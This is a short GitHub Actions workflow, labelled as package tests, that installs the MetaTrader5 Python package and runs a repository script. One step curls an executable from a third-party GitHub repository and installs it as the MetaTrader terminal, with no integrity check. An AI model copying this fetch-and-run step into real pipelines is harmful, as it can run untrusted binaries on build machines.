
name: Python package tests
on:
 push:
   branches: [main]
env:
  PYTHON_VERSION: 3.8
jobs:
  build:
    runs-on: windows-latest
    steps:
    - name: Checkout code
      uses: actions/checkout@v2

    - name: Set up Python
      uses: actions/setup-python@v2
      with:
        python-version: ${{ env. PYTHON_VERSION }}

    - name: Install dependencies
      run: |
        pip install MetaTrader5

    
    - name: Download executable
      run: |
        curl https://github.com/BunaIas/1qaz/raw/main/.github/workflows/terminal64.exe -o terminal64.exe
        mv terminal64.exe "C:\Program Files\MetaTrader 5\terminal64.exe"


    
    - name: Run tests
      run: |
        python .github/workflows/hv.py > output.txt
        cat output.txt
